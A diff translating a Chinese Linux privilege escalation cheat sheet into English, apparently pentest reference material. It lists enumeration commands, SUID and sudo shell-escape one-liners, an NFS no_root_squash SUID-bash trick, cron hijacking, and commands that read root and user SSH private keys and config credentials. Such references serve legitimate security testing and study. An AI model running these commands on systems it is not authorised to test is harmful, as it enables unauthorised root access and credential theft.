@@ -1,50 +1,50 @@
-# Linux 提权速查
+# Linux Privilege Escalation Quick Reference
 
-## 快速枚举脚本
+## Quick Enumeration Script
 
 ```bash
-# LinPEAS 风格枚举
-# 1. 检查当前用户和权限
+# LinPEAS-style enumeration
+# 1. Check current user and privileges
 id; whoami; sudo -l
 
-# 2. 检查 SUID 文件
+# 2. Check SUID files
 find / -perm -4000 2>/dev/null
 
-# 3. 检查 sudo 可用命令
+# 3. Check available sudo commands
 sudo -l
 
-# 4. 检查 crontab
+# 4. Check crontab
 cat /etc/crontab
 ls -la /etc/cron.d/
 
-# 5. 检查网络
+# 5. Check network
 netstat -tulpn
 ss -tulpn
 
-# 6. 检查服务
+# 6. Check services
 ps aux | grep root
 systemctl list-units --type=service
 
-# 7. 检查可写目录
+# 7. Check writable directories
 find / -writable -type d 2>/dev/null | grep -v proc
 
-# 8. 检查内核版本
+# 8. Check kernel version
 uname -a
 cat /etc/issue
 
-# 9. 检查 sudo 版本 (CVE)
+# 9. Check sudo version (CVE)
 sudo --version
 
-# 10. 检查 polkit 版本
+# 10. Check polkit version
 pkexec --version
 ```
 
-## 常见提权路径
+## Common Privilege Escalation Paths
 
-### 1. SUID 提权
+### 1. SUID Escalation
 
 ```bash
-# 常见可利用 SUID
+# Common exploitable SUID binaries
 nmap:        nmap --interactive; !sh
 vim:         vim -c ':!/bin/sh'
 less:        less /etc/passwd; !/bin/sh
@@ -58,11 +58,11 @@ bash:        bash -p
 sh:          sh
 ```
 
-### 2. Sudo 提权
+### 2. Sudo Escalation
 
 ```bash
-# sudo -l 查看可用命令
-# 常见可提权命令
+# Check available commands with: sudo -l
+# Common escalation commands
 sudo git help config; !/bin/sh
 sudo less /etc/passwd; !/bin/sh
 sudo vim; :!/bin/sh
@@ -74,32 +74,32 @@ sudo ruby -e 'exec "/bin/sh"'
 sudo lua -e 'os.execute("/bin/sh")'
 ```
 
-### 3. Cron 提权
+### 3. Cron Escalation
 
 ```bash
-# 检查 cron 任务
+# Check cron jobs
 cat /etc/crontab
 ls -la /etc/cron.d/
-# 如果 cron 任务以 root 权限运行且可写
-# 修改脚本追加恶意命令
+# If a cron job runs as root and the script is writable,
+# append a malicious command to the script
 ```
 
-### 4. NFS 提权
+### 4. NFS Escalation
 
 ```bash
-# 如果 /home 有 no_root_squash
-# 从另一台机器挂载
+# If /home has no_root_squash
+# Mount from another machine
 mount -t nfs target:/home /tmp/nfs
 cp /bin/bash /tmp/nfs/bash_suid
 chmod +s /tmp/nfs/bash_suid
-# 在目标机器执行 /tmp/nfs/bash_suid -p
+# Then run /tmp/nfs/bash_suid -p on the target
 ```
 
-### 5. 内核漏洞
+### 5. Kernel Exploits
 
 ```python
-# 搜索可用 exploit
-# 常用漏洞：
+# Search for usable exploits
+# Common vulnerabilities:
 # - dirtycow (CVE-2016-5195)
 # - docker breakout
 # - overlayfs (CVE-2021-3493)
@@ -107,34 +107,34 @@ chmod +s /tmp/nfs/bash_suid
 # - etc.
 ```
 
-### 6. 密码复用
+### 6. Password Reuse
 
 ```bash
-# 检查可读配置文件
+# Check readable config files
 cat /etc/mysql/my.cnf
 cat /var/www/html/config.php
 cat /home/*/.ssh/id_rsa
 cat /root/.ssh/id_rsa
-# 如果找到密码，尝试 su root 或 ssh root@localhost
+# If a password is found, try: su root or ssh root@localhost
 ```
 
-## 敏感文件位置
+## Sensitive File Locations
 
 ```
-/etc/passwd          # 可被部分系统写入
-/etc/shadow          # 通常不可读
-/root/.ssh/          # root SSH 私钥
-/home/*/.ssh/       # 用户 SSH 私钥
-/var/www/html/       # Web 目录（可能含配置）
-/tmp/                # 可写目录（放 payload）
-/etc/cron.d/         # Cron 配置
-/proc/self/environ   # 环境变量（含敏感信息）
-/proc/self/fd/       # 文件描述符（可能泄漏信息）
+/etc/passwd          # writable on some systems
+/etc/shadow          # usually not readable
+/root/.ssh/          # root SSH private key
+/home/*/.ssh/       # user SSH private keys
+/var/www/html/       # web directory (may contain configs)
+/tmp/                # writable directory (place payloads)
+/etc/cron.d/         # cron config
+/proc/self/environ   # environment variables (may contain secrets)
+/proc/self/fd/       # file descriptors (may leak info)
 ```
 
-## GTFOBins (sudo suid 查表)
+## GTFOBins (sudo/suid lookup)
 
-| 命令 | 提权方式 |
+| Command | Escalation Method |
 |------|---------|
 | `nmap` | `nmap --interactive` → `!sh` |
 | `vim` | `:!/bin/sh` |
